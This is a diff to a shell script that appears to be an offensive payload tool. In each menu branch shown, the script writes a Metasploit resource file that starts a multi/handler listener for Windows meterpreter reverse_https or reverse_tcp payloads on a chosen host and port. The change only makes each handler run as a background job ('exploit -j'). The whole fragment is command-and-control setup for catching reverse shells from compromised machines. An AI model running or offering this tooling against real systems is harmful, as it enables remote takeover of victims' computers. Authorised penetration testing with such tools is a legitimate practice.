@@ -607,7 +607,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 2)
@@ -647,7 +647,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 3)
@@ -680,7 +680,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/meterpreter_reverse_https" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 4)
@@ -712,7 +712,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 5)
@@ -743,7 +743,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/meterpreter/reverse_https" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 
@@ -778,7 +778,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 7)
@@ -808,7 +808,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j" >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 ;;
 8)
